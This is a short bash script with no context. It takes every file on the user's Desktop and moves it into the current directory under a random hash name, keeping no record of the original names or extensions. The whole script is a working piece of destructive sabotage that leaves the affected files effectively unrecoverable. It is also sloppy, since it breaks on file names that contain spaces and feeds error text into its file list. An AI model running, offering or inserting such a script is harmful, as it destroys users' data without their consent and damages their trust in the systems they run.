
#!/bin/bash

PERR=$(find $HOME/Desktop -type f 2>&1)
for i in $PERR; do
    mv $i $(echo $RANDOM | md5 | head -c 20)
done
